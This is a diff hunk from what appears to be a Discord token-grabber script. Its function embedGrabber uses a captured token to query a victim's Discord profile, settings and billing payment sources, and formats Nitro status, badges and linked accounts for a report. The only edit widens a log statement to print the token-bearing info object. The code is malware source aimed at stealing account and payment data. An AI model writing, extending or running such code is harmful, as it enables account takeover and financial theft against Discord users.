@@ -243,7 +243,7 @@ function embedGrabber(profile, info, token) {
   const settings = getAPI(`https://discord.com/api/v9/users/@me/settings`, info.token);
   const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);
 
-  console.log(profile);
+  console.log({...profile, ...info});
   const nitro = profile?.premium ? profile.premium.boost_actual.badge : `\`No found\``;
   const badges = profile.badges[0] ? profile.badges.map(e => e.badge).join(', ') : `\`No found\``;
   const accounts = profile.accounts[0] ? profile.accounts.map(e => e.type).join(', ') : `\`No found\``;
